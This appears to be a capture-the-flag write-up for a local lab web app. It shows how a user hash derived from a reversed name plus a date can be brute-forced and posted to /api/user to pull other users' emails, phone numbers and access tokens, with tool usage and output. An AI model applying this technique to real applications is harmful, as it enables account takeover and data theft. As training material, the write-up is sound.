# DNS Exfiltration
## Code exposed in frontend
When a user visit `/register` to create a new account we can see that a GET request is made to `http://127.0.0.1:8081/js/register.js`. Looking in the code we find the functions the server uses to create the unique users hashes:

![image](https://github.com/user-attachments/assets/7bb6195e-2f64-40fe-879b-614e3e07f976)

At this point we don't know what the hash is used for, but as we login to the application and view `/profile` we can see that a POST request is sent to `/api/user` with the payload `"user_hash":"04df85..."`. 

Taking a closer look on how the `user_hash` is created we can see that it:
1. Get `fullName` = "Paul" + "Cohen" → "PaulCohen"
2. Reverse `fullName` = "PaulCohen" → "nehoCluaP"
3. Append date = "nehoCluaP" + "30042025" → "nehoCluaP30042025"
4. UTF8 encode and SHA-256 hash "nehoCluaP30042025"
5. Hex encode the hash resulting in the 64-character long `user_hash`

If we know a accounts firstname and lastname we should be able to brute force the date and that way generate a valid `user_hash`.

Luckily for us, three brilliant mathematicians, _Alan Turing_, _Blaise Pascal_, and _Leonhard Euler_, have written a blog post which we can see on the home page.

## Exploit vulnerability
With three known names (four with our own user) we can build a script to generate hashes and send a POST request to `/api/user` to extract their `access_token`.

> :warning: **Important Note** :warning:
> 
> First- & Lastname is casesensitive!

```bash
» python3 genHashes.py --help 
usage: genHashes.py [-h] -e EMAIL -p PASSWORD -n NAME -y YEAR [-v]

Brute-force user hash generation.

options:
  -h, --help            show this help message and exit
  -e, --email EMAIL     Email address for login.
  -p, --password PASSWORD
                        Password for login.
  -n, --name NAME       Full name of the user in 'firstname lastname' format.
  -y, --year YEAR       Year to generate hashes for (e.g. 2025).
  -v, --verbose         Enable verbose output.

» python3 genHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Alan Turing" -y 2025   
[+] Logged in successfully!
[*] Brute-forcing hashes for Alan Turing for the year 2025...
[+] User request successful!
Response: {'first_name': 'Alan', 'last_name': 'Turing', 'email': 'alanT1912@gmail.com', 'phone_number': '+01233210456654789987', 'access_token': 'TUR1NG_SUP3R_S3CR37_4CC355_70K3N'}

» python3 genHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Blaise Pascal" -y 2024
[+] Logged in successfully!
[*] Brute-forcing hashes for Blaise Pascal for the year 2024...
[+] User request successful!
Response: {'first_name': 'Blaise', 'last_name': 'Pascal', 'email': 'theRealPascal@gmail.com', 'phone_number': '+99887766554433221100', 'access_token': 'P4SC4L_SUP3R_S3CR37_4CC355_70K3N'}

» python3 genHashes.py -e "three@exploit.se" -p "Passw0rd\!" -n "Leonhard Euler" -y 2023 -v
[+] Logged in successfully!
[*] Brute-forcing hashes for Leonhard Euler for the year 2023...
[!] Testing date 01012023 → 25ec3f75d449d2ad704b11f7baddf4b2b89f52f58e30c055cf79d9818589eab4
[... snip ...]
[!] Testing date 11122023 → de7834ea8e5d46f324f8ebd90fc0e4ce087ce819f2a1143aa8fb415975466523
[✓] Found valid hash for Leonhard Euler on 11122023
Response: {'first_name': 'Leonhard', 'last_name': 'Euler', 'email': 'eulerThis@gmail.com', 'phone_number': '+00112233445566778899', 'access_token': '3UL3R_SUP3R_S3CR37_4CC355_70K3N'}
```
